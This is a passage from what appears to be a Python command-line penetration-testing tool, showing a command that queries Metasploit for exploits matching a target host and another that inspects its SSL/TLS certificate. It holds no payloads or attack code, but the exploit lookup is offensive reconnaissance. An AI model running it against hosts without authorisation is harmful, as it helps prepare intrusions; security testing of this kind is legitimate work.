        print(f"{Fore.CYAN}[*] Connecting...")
        if msf.auth():
            print(f"{Fore.GREEN}[+] Connected\n")

            print(f"{Fore.CYAN}[*] Searching exploits for {target}...")
            exploits = msf.search_exploits(target)

            if exploits:
                print(f"{Fore.GREEN}[+] Found {len(exploits)} exploits\n")
                for i, exp in enumerate(exploits[:5], 1):
                    print(f"  {i}. {exp.get('name', 'Unknown')}")
                    print(f"     Rank: {exp.get('rank', 'unknown')}\n")
            else:
                print(f"{Fore.YELLOW}[!] No exploits found")
        else:
            print(f"{Fore.RED}[!] Connection failed")
            print(f"{Fore.YELLOW}Start Metasploit with: msfconsole")

    except Exception as e:
        err(str(e))


@cli.command()
@click.option('--target', '-t', required=True, help='Target hostname')
def ssl_check(target: str):
    """Check SSL/TLS certificate"""
    print_header()
    print(f"{Fore.CYAN}[*] Checking SSL/TLS on {Fore.GREEN}{target}{Style.RESET_ALL}\n")

    try:
        scanner = AdvancedReconScanner(target)
        cert_info = scanner.ssl_tls_check()

        if 'error' not in cert_info:
            print(f"{Fore.GREEN}[+] Certificate Info:\n")
            print(f"  Subject: {cert_info.get('subject', {})}")
            print(f"  Issuer: {cert_info.get('issuer', {})}")
            print(f"  TLS Version: {cert_info.get('version', 'Unknown')}\n")
        else:
            print(f"{Fore.RED}[!] Error: {cert_info['error']}\n")

    except Exception as e:
        err(str(e))


if __name__ == '__main__':
    cli()
